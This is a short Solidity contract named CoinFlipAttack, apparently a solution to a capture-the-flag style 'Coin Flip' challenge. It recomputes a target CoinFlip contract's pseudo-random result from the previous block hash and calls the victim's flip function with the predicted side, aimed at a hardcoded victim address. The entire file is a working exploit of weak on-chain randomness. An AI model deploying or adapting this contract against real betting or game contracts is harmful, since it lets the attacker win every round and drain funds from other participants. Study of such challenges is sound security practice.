// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';
import './CoinFlip.sol';

contract CoinFlipAttack {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public victimContract;

  constructor() public {
    // Change to victims address instanciation
    victimContract = CoinFlip(0x2AC87251F9811CA75e6A2e11Cf91E38b1Cc91042);
  }

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    victimContract.flip(side);
  }
}